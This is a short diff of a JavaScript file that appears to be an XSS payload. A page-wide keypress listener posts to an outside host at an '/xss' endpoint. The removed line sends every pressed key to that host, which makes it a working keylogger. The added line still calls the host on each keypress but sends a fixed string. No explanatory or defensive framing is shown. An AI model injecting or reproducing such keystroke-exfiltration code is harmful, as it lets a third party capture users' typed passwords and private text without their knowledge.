@@ -18,5 +18,5 @@ function ajaxRequest (method, url, data) {
 }
 
 document.addEventListener('keypress', function (e) {
-    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', '{"key":' + e.key + '}')
+    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', 'hello')
 })
